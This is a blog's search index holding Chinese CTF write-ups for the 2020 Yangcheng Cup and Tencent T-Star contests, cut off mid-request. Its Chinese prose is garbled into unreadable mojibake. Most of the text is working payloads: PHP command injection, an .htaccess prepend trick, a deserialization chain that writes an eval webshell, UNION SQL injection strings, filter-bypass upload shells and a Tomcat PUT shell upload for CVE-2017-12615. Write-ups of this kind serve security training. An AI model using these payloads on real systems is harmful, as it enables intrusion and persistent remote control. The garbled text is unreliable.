<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ç¾ŠåŸæ¯ 2020</title>
    <url>/2020/09/11/2020%E5%B9%B4%E3%80%8C%E7%BE%8A%E5%9F%8E%E6%9D%AF%E3%80%8D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    <content><![CDATA[<p>è®°å½•ä¸€ä¸‹wp<a id="more"></a></p>
<h1 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h1><p>è¿æ¥ä¸Šèšå‰‘åï¼Œå‘ç°<code>bbbbbbbbb.txt</code>æ–‡ä»¶ï¼Œbase64è§£ç ä¿å­˜ä¸ºå›¾ç‰‡å³å¯çœ‹åˆ°flagã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">r&#x27;bbbbbbbbb.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">f2 = open(<span class="string">r&#x27;1.txt&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">flag = (base64.b64decode(s))</span><br><span class="line">f2.write(flag)</span><br><span class="line">f2.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h1 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h1><p>æºç åœ¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">view-source:http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10022</span>/Hei_Mao_Jing_Chang.mp3</span><br></pre></td></tr></table></figure>

<p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;è°ï¼ç«Ÿæ•¢è¸©æˆ‘ä¸€åªè€³çš„å°¾å·´ï¼&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;One-ear&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;æœ‰æ„ç„å‡†ï¼Œæ— æ„å‡»å‘ï¼Œä½ çš„æ¢¦æƒ³å°±æ˜¯ä½ è¦ç„å‡†çš„ç›®æ ‡ã€‚ç›¸ä¿¡è‡ªå·±ï¼Œä½ å°±æ˜¯é‚£é¢—å°„ä¸­é¶å¿ƒçš„å­å¼¹ã€‚&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.$_POST[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>åŸé¢˜åœ¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://neversecure.ca/category/bug-hunting/</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10022</span>/</span><br><span class="line"><span class="comment">#postæäº¤</span></span><br><span class="line">Black-Cat-Sheriff=<span class="number">04</span>b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One-ear=;cat+flag.php&amp;White-cat-monitor=%<span class="number">5</span>B%<span class="number">5</span>D</span><br></pre></td></tr></table></figure>

<h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ç½‘ä¸Šå¯ä»¥æ‰¾åˆ°åŸé¢˜ï¼š<code>X-NUCA&#39;2019â€”Ezphp</code></p>
<p>å‰æçŸ¥è¯†ï¼š</p>
<p><code>php.ini</code>ä¸­æœ‰ä¸¤é¡¹ï¼š</p>
<p>åœ¨æ‰€æœ‰é¡µé¢çš„é¡¶éƒ¨ä¸åº•éƒ¨requireæ–‡ä»¶</p>
<ul>
<li><p><code>auto_prepend_file</code> åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶</p>
</li>
<li><p><code>auto_append_file</code> åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶</p>
</li>
</ul>
<p>ä¾‹å¦‚ï¼š</p>
<p>å°†<code>.htaccess</code>è¿™ä¸ªæ–‡ä»¶åŒ…å«è¿›æ‰€æœ‰çš„phpé¡µé¢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯¹äº<code>stristr()</code>çš„é»‘åå•è¿‡æ»¤ç›´æ¥ç”¨åæ–œæ å³å¯ç»•è¿‡</p>
<p>å¯¹äºåé¢æ‹¼æ¥è¿›æ¥çš„<code>&quot;\nHello World&quot;</code>éœ€è¦ç”¨åæ–œæ è½¬ä¹‰</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?content=php_value auto_prepend_fil\%0Ae .htaccess%0A%23&lt;?php system(&#x27;cat /f&#x27;.&#x27;lag&#x27;);?&gt;\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>

<h1 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h1><p>é¦–å…ˆè®¿é—®<code>robots.txt</code>ï¼Œæç¤º<code>Disallow: /star1.php/</code>ï¼Œæºä»£ç é‡Œæœ‰:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!--  å°èƒ–è¯´ç”¨ä¸ªä¸å®‰å…¨çš„åè®®ä»æˆ‘å®¶æ‰èƒ½è¿›ser.phpå‘¢ï¼  !--&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸å®‰å…¨åè®®ç”¨<code>http</code>è®¿é—®ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10024/sandbox/hrnh1cvpq4bvbm960878icaodb/star1.php?path=http://127.0.0.1/sandbox/hrnh1cvpq4bvbm960878icaodb/ser.php</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line">$flag=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $text;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;&#x27;</span>,$text=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = $file;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = $text;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $d   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        $a= $d. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">         @file_put_contents(<span class="keyword">$this</span>-&gt; file,$a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾<code>file_put_contents</code>æ˜¯è¦å†™shellè¿›å»ï¼Œå¹¶ä¸”åœ¨å†…å®¹å‰åŠ äº†æ­»äº¡å‡½æ•°ï¼Œé‚æ„é€ é“¾æ¡ï¼Œè¿™é‡Œè§¦å‘<code>__toString</code>ï¼Œä½†æ˜¯æ²¡æœ‰åœ°æ–¹å¯ä»¥è§¦å‘ï¼Œç›²çŒœåº”è¯¥æ˜¯<code>echo unserialize</code>çš„ååºåˆ—å…¥å£ã€‚æ„é€ é“¾å¦‚ä¸‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$GWHT = new GWHT();</span><br><span class="line">$GWHT-&gt;hero = new Yongen();</span><br><span class="line">$GWHT-&gt;hero-&gt;file = &#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;;</span><br><span class="line">$GWHT-&gt;hero-&gt;text = &#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;;</span><br><span class="line">$a = serialize($GWHT);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10024/sandbox/hrnh1cvpq4bvbm960878icaodb/star1.php?path=http://127.0.0.1/sandbox/hrnh1cvpq4bvbm960878icaodb/ser.php&amp;c=O:4:&quot;GWHT&quot;:1:&#123;s:4:&quot;hero&quot;;O:6:&quot;Yongen&quot;:2:&#123;s:4:&quot;file&quot;;s:77:&quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;;s:4:&quot;text&quot;;s:40:&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿ä¸Šåœ¨æ ¹ç›®å½•<code>/ffflag</code>å³å¯è·å¾—flagã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10024</span>/sandbox/hrnh1cvpq4bvbm960878icaodb/shell.php</span><br><span class="line">cmd</span><br></pre></td></tr></table></figure>

<h1 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h1><p>é¦–å…ˆç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10025/?file=php://filter/read=convert.quoted-printable-encode/resource=GWHT.php</span><br><span class="line">http://183.129.189.60:10025/?file=php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=GWHT.php</span><br></pre></td></tr></table></figure>

<p>æºç ä¸ºï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;&lt;img src=&quot;question.jpg&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt; &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&#x27;pass&#x27;</span>] !== getenv(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        die(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; name=&quot;count&quot; rows=10 cols=50&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">    <span class="keyword">if</span> (isset($_GET[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        $count = $_GET[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, $count))&#123;</span><br><span class="line">        	die(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        echo <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $count . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå¯ä»¥ç”¨å•å¼•å·åµŒå¥—åå¼•å·æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10025/?file=GWHT.php&amp;count=&#x27;`ls &gt; 1.txt`&#x27;</span><br></pre></td></tr></table></figure>

<p>å‰æçŸ¥è¯†ï¼š</p>
<p>å› ä¸ºè¿‡æ»¤äº†<code>$_POST</code>å’Œ<code>$_GET</code>ï¼Œéœ€è¦å¯ä»¥ç”¨åˆ°<code>get_defined_vars()</code>ã€‚</p>
<p>æ‰“å°ä¸€ä¸ª<code>get_defined_vars()</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">array(4) &#123; [&quot;_GET&quot;]=&gt; array(0) &#123; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(1) &#123; [&quot;pass&quot;]=&gt; string(4) &quot;PASS&quot; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; &#125; </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æœ€å¤–å±‚æ˜¯ä¸€ä¸ª<code>array</code>ï¼Œ<code>array</code>çš„ç¬¬ä¸€ä¸ªå€¼æ˜¯<code>_GET</code>ï¼Œå¦‚æœæˆ‘ä»¬åœ¨å‡½æ•°å¤–å±‚åµŒå¥—ä¸¤å±‚poså°±å¯ä»¥è·å–åˆ°<code>_GET</code>çš„å€¼äº†ï¼Œä¸‹é¢å°±ç›¸å½“äºä¸€ä¸ªä¸€å¥è¯æœ¨é©¬äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eval(pos(pos(get_defined_vars())));</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10021/?file=GWHT.php&amp;count=&#x27;`echo &quot;&lt;?=eval(pos(pos(get_defined_vars())))?&gt;&quot;&gt;1.php`&#x27;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†å†™ä¸€ä¸ª<code>post</code>çš„ğŸ</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10021/1.php?a=file_put_contents(&#x27;kkk.php&#x27;, base64_decode(&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&#x27;));</span><br></pre></td></tr></table></figure>

<p>åˆæˆ–è€…ç”¨<code>next</code>å¯ä»¥ç›´æ¥è¿æ¥èšå‰‘</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10021/?file=GWHT.php&amp;count=&#x27;`echo &quot;&lt;?=eval(pos(next(get_defined_vars())))?&gt;&quot;&gt;1.php`&#x27;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>è…¾è®¯T-Staré«˜æ ¡æŒ‘æˆ˜èµ› 2020</title>
    <url>/2020/07/02/2020%E8%85%BE%E8%AE%AF%E7%8A%80%E7%89%9B%E9%B8%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    <content><![CDATA[<p>Gqå’Œhhhmå¸ˆå‚…tql<a id="more"></a></p>
<h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>è€ƒç‚¹ï¼šå‰ç«¯jséªŒè¯å›¾ç‰‡åç¼€</p>
<p>ä¸Šä¼ jpgå›¾ç‰‡åæ”¹phpåç¼€forwordï¼Œå†…å®¹æ˜¯ä¸€å¥è¯æœ¨é©¬</p>
<p>åœ¨keyç›®å½•ä¸‹æœ‰key{K735c9f0D7ddc3b9}</p>
<h2 id="æˆç»©å•"><a href="#æˆç»©å•" class="headerlink" title="æˆç»©å•"></a>æˆç»©å•</h2><p>è¾“å…¥æ¡†è¾“å…¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3,database()--</span></span><br><span class="line"><span class="string">0&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;web1&#x27;</span><span class="comment">#</span></span><br><span class="line"><span class="number">0</span><span class="string">&#x27; union select 1,2,3,column_name from information_schema.columns where table_name=&#x27;</span>fl4g<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">0&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,flag <span class="keyword">from</span> fl4g<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="å‘½ä»¤æ‰§è¡ŒåŸºç¡€"><a href="#å‘½ä»¤æ‰§è¡ŒåŸºç¡€" class="headerlink" title="å‘½ä»¤æ‰§è¡ŒåŸºç¡€"></a>å‘½ä»¤æ‰§è¡ŒåŸºç¡€</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">baidu.com | cat  ..&#x2F;key.php</span><br></pre></td></tr></table></figure>

<h2 id="ä½ èƒ½çˆ†ç ´å—"><a href="#ä½ èƒ½çˆ†ç ´å—" class="headerlink" title="ä½ èƒ½çˆ†ç ´å—"></a>ä½ èƒ½çˆ†ç ´å—</h2><ul>
<li><p>burpsuiteçˆ†ç ´å¯†ç è´¦å·éƒ½æ˜¯adminï¼Œç™»é™†æˆåŠŸä¼šsetä¸€ä¸ªcookieï¼Œcookieæ˜¯ç”¨æˆ·åçš„base64ã€‚</p>
</li>
<li><p>payload</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-admin<span class="string">&quot;union select 1,(select group_concat(flag) from flag),3-- </span></span><br></pre></td></tr></table></figure>

<ul>
<li>base64</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LWFkbWluInVuaW9uIHNlbGVjdCAxLChzZWxlY3QgZ3JvdXBfY29uY2F0KGZsYWcpIGZyb20gZmxhZyksMy0tIA==</span><br></pre></td></tr></table></figure>

<h2 id="æ–‡ä»¶åŒ…å«GetShell"><a href="#æ–‡ä»¶åŒ…å«GetShell" class="headerlink" title="æ–‡ä»¶åŒ…å«GetShell"></a>æ–‡ä»¶åŒ…å«GetShell</h2><p>é¦–å…ˆåœ¨<code>lfi.txt</code>è¯»åˆ°æºç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($file != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    $inc = sprintf(<span class="string">&quot;%s.php&quot;</span>, $file); // only php file can be included</span><br><span class="line">    include($inc);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ç”¨ä¼ªåè®®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>

<h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><ul>
<li><p>å¯¹&lt;?ã€phpã€evalç­‰è¿›è¡Œäº†è¿‡æ»¤ï¼Œè¿‡æ»¤æ¯”è¾ƒç®€å•ç›´æ¥æ›¿æ¢ä¸ºç©ºï¼Œç›´æ¥åŒå†™å°±èƒ½ç»•è¿‡ï¼Œevalç›´æ¥åˆ©ç”¨phpå¯¹å¤§å°å†™ä¸æ•æ„Ÿç»•è¿‡ã€‚</p>
</li>
<li><p>payload</p>
</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;php?&lt;?p&lt;?phphp EVAL($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ”¹.phtçš„åç¼€èƒ½ä¸Šä¼ ï¼Œé™åˆ¶äº†20kb-100kbçš„æ–‡ä»¶å¤§å°ï¼Œå’Œå›¾ç‰‡æ··åœ¨ä¸€èµ·ä¸Šä¼ å³å¯ï¼Œè¿ä¸Šèšå‰‘ä¹‹ååœ¨keyä¸‹å‘ç°flag{Aa3c7c37508E40B3}</p>
<h2 id="å°çŒ«å’ªè¸©ç¯æ³¡"><a href="#å°çŒ«å’ªè¸©ç¯æ³¡" class="headerlink" title="å°çŒ«å’ªè¸©ç¯æ³¡"></a>å°çŒ«å’ªè¸©ç¯æ³¡</h2><p>é¢˜ç›®ç»™hint</p>
<ul>
<li>CVE-2017-12615</li>
</ul>
<p>æŠ“åŒ…æŠŠGETæ”¹ä¸ºPUTï¼Œåé¢æ·»åŠ jspåŠ æ–œæ ä¸Šä¼ é©¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PUT /kawhi.jsp/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">012</span>c8bc2.yunyansec.com</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">77.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">77.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span 